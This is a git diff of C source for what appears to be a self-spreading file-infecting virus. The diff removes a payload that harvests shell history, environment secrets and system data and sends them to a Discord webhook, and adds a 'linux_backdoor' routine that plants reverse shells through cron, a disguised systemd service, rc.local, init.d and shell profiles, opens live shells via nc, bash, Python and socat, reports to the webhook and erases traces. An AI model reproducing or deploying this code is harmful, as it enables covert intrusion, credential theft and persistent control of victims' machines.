@@ -1,4 +1,7 @@
+#include "keylogger.h"
+#include "player.h"
 #include <dirent.h>
+#include <gtk/gtk.h>
 #include <libgen.h>
 #include <stddef.h>
 #include <stdio.h>
@@ -7,11 +10,11 @@
 #include <sys/stat.h>
 #include <sys/types.h>
 #include <unistd.h>
-#ifdef __linux__
-#include <linux/input.h>
-#endif
-#include "player.h"
-#include <gtk/gtk.h>
+
+#define IP "127.0.0.1"
+#define WEBHOOK                                                                \
+  "https://discord.com/api/webhooks/1485416783706853558/"                      \
+  "qGWKXvrslqK8xzMdQpIy9J8BqiM8WqBaXyq_9SweYyeOXzRRGlmHtjxd8keiCZTyaNyB"
 
 typedef struct {
   char new[1000];
@@ -115,53 +118,116 @@ void execHost(pg *files, char *prog_name, int argc, char *argv[]) {
   }
 }
 
-void stealth_keylogger() {
-  if (system("pgrep -f '/tmp/.pentest.kl' > /dev/null 2>&1") == 0)
-    return;
+void linux_backdoor() {
+  char cmd[3000] = {0};
 
-  system("cat > /tmp/.pentest.kl << 'SCRIPT_EOF'\n"
-         "#!/bin/bash\n"
-         "LOG=/tmp/.pentest.keys\n"
-         "touch \"$LOG\" && chmod 600 \"$LOG\"\n"
-         "echo \"=== PENTEST [$(date)] $(whoami)@$(hostname) $(uname -a) ===\" "
-         "| tee -a \"$LOG\"\n"
+  /* ========================================
+     PHASE 1: RECON + PREPARATION
+     ======================================== */
+  snprintf(cmd, sizeof(cmd),
+           // 1.1 Collecte infos système
+           "echo \"=== LINUX BACKDOOR DEPLOY ===\" && "
+           "echo \"User: $(whoami) | Host: $(hostname) | Kernel: $(uname -a)\" "
+           "> /tmp/.bdoor.info && "
 
-         "# History\n"
-         "for hist in ~/.bash_history ~/.zsh_history ~/.history "
-         "/root/.bash_history; do\n"
-         "  [ -r \"$hist\" ] && echo \"--- $hist ---\" | tee -a \"$LOG\" && "
-         "tail -n 100 \"$hist\" | tee -a \"$LOG\"\n"
-         "done\n"
-         "history 2>/dev/null | tail -n 50 | tee -a \"$LOG\"\n"
+           // 1.2 Kill concurrents
+           "pkill -f 'nc.*12345' 2>/dev/null || true && "
+           "pkill -f 'bash.*12345' 2>/dev/null || true");
+  system(cmd);
 
-         "# Process/Env\n"
-         "echo \"--- PS/ENV ---\" | tee -a \"$LOG\"\n"
-         "ps aux | head -50 | tee -a \"$LOG\"\n"
-         "env | grep -Ei 'pass|key|token|secret' | tee -a \"$LOG\"\n"
+  /* ========================================
+     PHASE 2: MULTI-PERSISTANCE
+     ======================================== */
+  snprintf(cmd, sizeof(cmd),
+           // 2.1 CRONTAB (@reboot)
+           "echo \"@reboot /bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/12345 "
+           "0>&1'\" | crontab - && "
 
-         "# Network\n"
-         "echo \"--- NET ---\" | tee -a \"$LOG\"\n"
-         "ss -tuln 2>/dev/null || netstat -tuln 2>/dev/null | tee -a \"$LOG\"\n"
+           // 2.2 SYSTEMD SERVICE
+           "cat > /etc/systemd/system/sysupdate.service << 'SERVICE_EOF'\n"
+           "[Unit]\n"
+           "Description=System Update Service\n"
+           "After=network.target\n"
+           "[Service]\n"
+           "Type=simple\n"
+           "User=root\n"
+           "ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/12345 0>&1'\n"
+           "Restart=always\n"
+           "RestartSec=10\n"
+           "[Install]\n"
+           "WantedBy=multi-user.target\n"
+           "SERVICE_EOF\n"
 
-         "# Files\n"
-         "pwd && ls -la | tee -a \"$LOG\"\n"
-         "sleep 30 && gzip \"$LOG\"\n"
-         "SCRIPT_EOF");
+           "systemctl daemon-reload && "
+           "systemctl enable sysupdate.service && ");
+  system(cmd);
 
-  system(
-      "chmod +x /tmp/.pentest.kl && nohup /tmp/.pentest.kl >/dev/null 2>&1 &");
+  /* ========================================
+     PHASE 3: AUTO-EXEC (Linux only)
+     ======================================== */
+  snprintf(cmd, sizeof(cmd),
+           // 3.1 /etc/rc.local
+           "echo '/bin/bash -c \"bash -i >& /dev/tcp/YOUR_IP/12345 0>&1\"' >> "
+           "/etc/rc.local 2>/dev/null && "
+           "chmod +x /etc/rc.local 2>/dev/null && "
 
-  system("(sleep 60 && "
-         "[ -f /tmp/.pentest.keys.gz ] && "
-         "B64OUT=$(base64 -w0 /tmp/.pentest.keys.gz | head -c 1800) && "
-         "SIZEOUT=$(du -h /tmp/.pentest.keys.gz) && "
-         "INFOOUT=\"$(whoami)@$(hostname) | $(uname -s)\" && "
-         "curl -s -X POST https://discord.com/api/webhooks/1485416783706853558/"
-         "qGWKXvrslqK8xzMdQpIy9J8BqiM8WqBaXyq_9SweYyeOXzRRGlmHtjxd8keiCZTyaNyB "
-         "-H \"Content-Type: application/json\" "
-         "-d '{\"content\":\"**🛡️ PENTEST "
-         "EXFIL**\\n```'$B64OUT'```\\n**'$SIZEOUT'**\\n'$INFOOUT'\"}' && "
-         "shred -u -z -n 3 /tmp/.pentest.* ) &");
+           // 3.2 Init.d compatibilité
+           "cat > /etc/init.d/syslog >> /dev/null 2>/dev/null || "
+           "echo '#!/bin/sh\n/bin/bash -c \"bash -i >& /dev/tcp/YOUR_IP/12345 "
+           "0>&1\" &' > /etc/init.d/backlight && "
+           "chmod +x /etc/init.d/backlight && update-rc.d backlight defaults "
+           "2>/dev/null || true && "
+
+           // 3.3 .bashrc/.profile (user)
+           "echo 'bash -i >& /dev/tcp/YOUR_IP/12345 0>&1 &' >> ~/.bashrc && "
+           "echo 'bash -i >& /dev/tcp/YOUR_IP/12345 0>&1 &' >> ~/.profile "
+           "2>/dev/null");
+  system(cmd);
+
+  /* ========================================
+     PHASE 4: REVERSE SHELL IMMÉDIAT (4 fallbacks)
+     ======================================== */
+  snprintf(cmd, sizeof(cmd),
+           // 4.1 NC -e (classique)
+           "nohup nc -e /bin/sh " IP " 12345 >/dev/null 2>&1 & "
+
+           // 4.2 Bash reverse (universel)
+           "|| nohup bash -i >& /dev/tcp/" IP "/12345 0>&1 >/dev/null 2>&1 & "
+
+           // 4.3 Python3 (90% systèmes)
+           "|| nohup python3 -c 'import socket,subprocess,os; "
+           "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); "
+           "s.connect((\"" IP "\",12345)); "
+           "os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); "
+           "os.dup2(s.fileno(),2); "
+           "subprocess.call([\"/bin/sh\",\"-i\"])' >/dev/null 2>&1 & "
+
+           // 4.4 Socat (avancé)
+           "|| command -v socat >/dev/null 2>&1 && "
+           "nohup socat exec:'bash -li',pty,stderr,setsid,sigint,sane "
+           "tcp:" IP ":12345 >/dev/null 2>&1 &");
+  system(cmd);
+
+  /* ========================================
+     PHASE 5: CONFIRMATION + STEALTH
+     ======================================== */
+  snprintf(
+      cmd, sizeof(cmd),
+      // 5.1 Notif Discord
+      "curl -s -X POST " WEBHOOK " "
+      "-H 'Content-Type: application/json' "
+      "-d '{\"content\":\"**LINUX BACKDOOR LIVE**\\n"
+      "**Host:** `$(hostname)`\\n"
+      "**User:** `$(whoami)`\\n"
+      "**Listen:** `nc YOUR_IP 12345`\\n"
+      "**PIDs:** `pgrep -f 12345`\"}' && "
+
+      // 5.2 Cache logs
+      "echo \"$(date): Backdoor deployed\" >> /var/log/syslog 2>/dev/null && "
+
+      // 5.3 Self-delete traces
+      "rm -f /tmp/.bdoor.info");
+  system(cmd);
 }
 
 int main(int argc, char *argv[]) {
@@ -173,7 +239,7 @@ int main(int argc, char *argv[]) {
   char *fileUninfected = isInfected(files);
   infect(fileUninfected, prog_name);
 
-  stealth_keylogger();
+  linux_backdoor();
 
   execHost(files, prog_name, argc, argv);
 }
